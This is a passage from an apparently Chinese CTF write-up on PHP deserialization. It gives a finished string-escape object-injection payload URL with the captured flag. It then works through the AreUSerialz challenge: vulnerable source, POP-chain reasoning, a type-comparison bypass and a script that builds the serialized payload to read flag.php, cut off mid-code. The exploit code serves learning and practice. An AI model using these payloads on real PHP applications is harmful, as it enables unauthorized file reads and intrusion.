class="hljs-string">&quot;;&#125;&#125;s:0:&quot;</span><span class="hljs-string">&quot;;s:0&quot;</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-title function_ invoke__">len</span>(<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;xx&quot;;s:8:&quot;password&quot;;s:82:&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-number">24</span><br>&gt;&gt;&gt;正好是往后面读取<span class="hljs-number">24</span>个<br></code></pre></td></tr></table></figure><p>但此时出现的问题时 你自己补充了两个xx确实后面吃的个数是24但是属性值前面的50也是补充后的结果 6*8 = 48-&gt;24 那么虽然补充了两个xx 但是意味着需要往后读50-24 = 26个字符长度 故读取失败</p><p>所以我们的补位不应该出现在这个属性值里面 而是在外面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">50</span>:<span class="hljs-string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">82</span>:<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;s:8:&quot;</span>flag.php<span class="hljs-string">&quot;;&#125;&#125;s:0:&quot;</span><span class="hljs-string">&quot;;s:0&quot;</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;&#x27;</span>;  <span class="hljs-comment">//在这里的开头补充x&quot; 相当于补充了两位</span><br>   <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> A)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">48</span>:<span class="hljs-string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">84</span>:<span class="hljs-string">&quot;x&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">0</span><span class="hljs-string">&quot;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>此时往后读24</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-title function_ invoke__">len</span>(<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:84:&quot;x&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>最终payload为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//122.114.252.87:2030/?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;</span><br></code></pre></td></tr></table></figure><p>url编码一下即可</p><p>成功获取flag！：flag{a6c175ea-d851-5cf1-cd6f-3aad733ae896}</p><hr><h2 id="0718-Phar反序列化"><a href="#0718-Phar反序列化" class="headerlink" title="0718 Phar反序列化"></a>0718 Phar反序列化</h2><h6 id="例题：-网鼎杯-2020-青龙组-AreUSerialz"><a href="#例题：-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="例题：[网鼎杯 2020 青龙组]AreUSerialz"></a>例题：[网鼎杯 2020 青龙组]AreUSerialz</h6><h6 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>寻找pop链：</strong></p><p>可以发现在read方法中存在file_get_contents函数，是可以利用获取flag的地方，所以需要我们调用read方法 可以发现在process方法中找到，就需要调用process方法并且需要op为2 所以construct方法中的无法使用，需要使用destruct方法，需要绕过他的强类型比较 将op设置为数字型的2 在强类型比较中字符型和数字型的2是不相等的 但在弱类型比较中是相等的 数字2就不加引号就可以了</p><p><strong>绕过上传点的限制：</strong></p><p>在is_valid函数中对ascii码进行一定检测，有限定范围 但是我们生成的序列化中存在\0字符，需要通过S的hex机制进行绕过检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-comment">// function __construct() &#123;</span><br>    <span class="hljs-comment">//     $op = &quot;1&quot;;</span><br>    <span class="hljs-comment">//     $filename = &quot;/tmp/tmpfile&quot;;</span><br>    <span class="hljs-comment">//     $content = &quot;Hello World!&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;process();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function process() &#123;</span><br>    <span class="hljs-comment">//     if($this-&gt;op == &quot;1&quot;) &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;write();</span><br>    <span class="hljs-comment">//     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br>    <span class="hljs-comment">//         $res = $this-&gt;read();</span><br>    <span class="hljs-comment">//         $this-&gt;output($res);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function write() &#123;</span><br>    <span class="hljs-comment">//     if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br>    <span class="hljs-comment">//         if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br>    <span class="hljs-comment">//             $this-&gt;output(&quot;Too long!&quot;);</span><br>    <span class="hljs-comment">//             die();</span><br>    <span class="hljs-comment">//         &#125;</span><br>    <span class="hljs-comment">//         $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br>    <span class="hljs-comment">//         if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br>    <span class="hljs-comment">//         else $this-&gt;output(&quot;Failed!&quot;);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;output(&quot;Failed!&quot;);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function read() &#123;</span><br>    <span class="hljs-comment">//     $res = &quot;&quot;;</span><br>    <span class="hljs-comment">//     if(isset($this-&gt;filename)) &#123;</span><br>    <span class="hljs-comment">//         $res = file_get_contents($this-&gt;filename);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">//     return $res;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function output($s) &#123;</span><br>    <span class="hljs-comment">//     echo &quot;[Result]: &lt;br&gt;&quot;;</span><br>    <span class="hljs-comment">//     echo $s;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// function __destruct() &#123;</span><br>    <span class="hljs-comment">//     if($this-&gt;op === &quot;2&quot;)</span><br>    <span class="hljs-comment">//         $this-&gt;op = &quot;1&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;content = &quot;&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;process();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-comment">// echo urlencode(serialize(new FileHandler));</span><br><span class="hljs-comment">// O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span><br><span class="hljs-comment">// 因为上传的时候存在检测ascii码存在一定的范围</span><br><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decorate</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$arr</span>); <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>],<span class="hljs-string">&quot;\0&quot;</span>) != <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">decorate</span>(<span class="hljs-variable">$ser</span>);<br><br><br><br><span class="hljs-comment">// function is_valid($s) &#123;</span><br><span class="hljs-comment">//     for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="hljs-comment">//         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="hljs-comment">//             return false;</span><br><span class="hljs-comment">//     return true;</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><br><span class="hljs-comment">//     $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="hljs-comment">//     if(is_valid($str)) &#123;</span><br><span class="hljs-comment">//         $obj = unserialize($str);</span><br><span class="hljs-comment">//     &#125;</span><br><br><span class="hljs-comment">// &#125;</span><br></code></pre></td></tr></table></figure><p>发现确实找到了小s 然后再写一个字符替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-comment">// function __construct() &#123;</span><br>    <span class="hljs-comment">//     $op = &quot;1&quot;;</span><br>    <span class="hljs-comment">//     $filename = &quot;/tmp/tmpfile&quot;;</span><br>    <span class="hljs-comment">//     $content = &quot;Hello World!&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;process();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function process() &#123;</span><br>    <span class="hljs-comment">//     if($this-&gt;op == &quot;1&quot;) &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;write();</span><br>    <span class="hljs-comment">//     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br>    <span class="hljs-comment">//         $res = $this-&gt;read();</span><br>    <span class="hljs-comment">//         $this-&gt;output($res);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function write() &#123;</span><br>    <span class="hljs-comment">//     if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br>    <span class="hljs-comment">//         if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br>    <span class="hljs-comment">//             $this-&gt;output(&quot;Too long!&quot;);</span><br>    <span class="hljs-comment">//             die();</span><br>    <span class="hljs-comment">//         &#125;</span><br>    <span class="hljs-comment">//         $res = file_put_contents($this-&gt;filename, 